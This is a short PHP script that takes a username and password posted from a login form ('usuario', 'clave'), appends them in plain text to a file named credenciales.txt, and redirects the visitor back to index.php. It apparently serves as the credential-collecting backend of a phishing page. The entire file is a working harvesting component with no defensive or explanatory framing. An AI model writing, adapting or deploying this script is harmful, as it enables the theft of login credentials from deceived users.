<?php
if(isset($_POST['usuario']) && isset($_POST['clave'])){
$file = fopen("credenciales.txt", "a");
fwrite($file, "---------------------------------------------". PHP_EOL);
fwrite($file, "Usuario: ".$_POST['usuario']. PHP_EOL);
fwrite($file, "Clave: ".$_POST['clave']. PHP_EOL);
fwrite($file, "---------------------------------------------". PHP_EOL);
fclose($file);
echo '<META HTTP-EQUIV="REFRESH" CONTENT="1;URL=index.php">';
}
?>
